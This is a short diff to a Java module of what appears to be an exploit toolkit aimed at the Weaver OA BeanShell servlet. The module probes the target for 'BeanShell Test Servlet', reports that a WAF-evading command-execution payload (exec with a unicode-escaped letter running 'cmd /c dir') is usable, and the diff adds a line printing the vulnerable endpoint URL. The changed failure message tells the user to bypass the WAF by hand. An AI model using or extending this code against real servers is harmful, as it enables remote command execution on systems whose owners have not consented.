@@ -29,9 +29,10 @@ public class weaveroa_BshServlet implements Exploitlnterface {
                     , new HashMap<String, String>(),"utf-8");
             if(post.getCode() == 200 && post.getText().contains("BeanShell Test Servlet")){
                 textArea.appendText("\n ex\\u0065c(\"cmd /c dir\"); 可用");
+                textArea.appendText("\n " + url + "/weaver/bsh.servlet.BshServlet/");
                 return true;
             }else {
-                textArea.appendText("\n payload未找到 请尝试手动绕过");
+                textArea.appendText("\n 漏洞存在 命令被waf拦截 请尝试手动绕过");
                 return true;
             }
 
